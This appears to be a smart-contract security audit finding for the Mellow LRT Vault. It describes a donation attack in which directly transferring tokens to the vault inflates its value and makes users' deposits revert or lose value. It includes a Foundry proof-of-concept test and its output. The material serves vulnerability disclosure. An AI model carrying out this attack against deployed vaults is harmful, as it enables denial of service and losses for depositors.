Sticky Parchment Gecko

High

# Deposit is susceptible to donation attack

## Summary
Deposit is susceptible to donation attack

## Vulnerability Detail
Consider the following scenario：

**1**.**Operator** deposits 10 gwei for initial deposit 
https://github.com/sherlock-audit/2024-06-mellow/blob/26aa0445ec405a4ad637bddeeedec4efe1eba8d2/mellow-lrt/src/Vault.sol#L353
after initial deposit :
**totalsupply** = 10 gwei (1e10)
[totalVaule](https://github.com/sherlock-audit/2024-06-mellow/blob/26aa0445ec405a4ad637bddeeedec4efe1eba8d2/mellow-lrt/src/Vault.sol#L324) = 10 gwei (1e10)

------------------------------------------------------------
**2**.**Attacker**  "donates" 1 ether to  inflate the **totalVaule** 

after attacker "donates":
**totalsupply** = 10 gwei (1e10)
**totalVaule** = 10 gwei (1e10) + 1e18=1,000000010000000000

--------------------------------------------------------------
**3**.**User** deposits 10 ether 
**depositValue** = 10e18
**minLpAmoun**t = 10e18


[lpAmount ](https://github.com/sherlock-audit/2024-06-mellow/blob/26aa0445ec405a4ad637bddeeedec4efe1eba8d2/mellow-lrt/src/Vault.sol#L360)= 10e18 * 1e10 / 1,000000010000000000 = 99999999000 (9.999e10)

**lpAmount**（9.999e10）<user **depositValue**(10e18) 



POC:
VaultTest.t.sol
```solidity
    function testpoc() public{
        Vault vault = new Vault("Mellow LRT Vault", "mLRT", admin);
        vm.startPrank(admin);
        vault.grantRole(vault.ADMIN_DELEGATE_ROLE(), admin);
        vault.grantRole(vault.OPERATOR(), operator);
        _setUp(vault);
        vm.stopPrank();
        _initialDeposit(vault);

        address depositor = address(bytes20(keccak256("depositor")));
        address depositor2 =address(bytes20(keccak256("depositor2")));
        //depositor2 donation 1 ether
        vm.startPrank(depositor2);
        deal(Constants.WSTETH, depositor2, 10 ether);
        IERC20(Constants.WSTETH).safeTransfer(address(vault),1 ether);
        vm.stopPrank();

        (address[] memory tokens, uint256[] memory amounts1) = vault
            .underlyingTvl();
        //after attacker "donates"
        //totalVaule = 10 gwei (1e10) + 1e18=1,000000010000000000
        assertEq(amounts1[0],10 gwei+ 1 ether);
        

        //user deposits 10 ether
        vm.startPrank(depositor);
        deal(Constants.WSTETH, depositor, 10 ether);
        IERC20(Constants.WSTETH).safeIncreaseAllowance(
            address(vault),
            10 ether
        );
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10 ether;
        vault.deposit(depositor, amounts, 10 ether, type(uint256).max);
        vm.stopPrank();
    }
```
**Console output:**
  ← [Revert] InsufficientLpAmount()

## Impact
1. Deposit is susceptible to[ Dos](https://github.com/sherlock-audit/2024-06-mellow/blob/26aa0445ec405a4ad637bddeeedec4efe1eba8d2/mellow-lrt/src/Vault.sol#L361) attack
2. If the user does not set **minLpAmount**（or too small）, the actual deposit amount (depositValue) will differ greatly from the calculated value (lpAmount), and the user may suffer losses.


## Code Snippet

## Tool used

Manual Review

## Recommendation
Consider recalculating **lpAmount**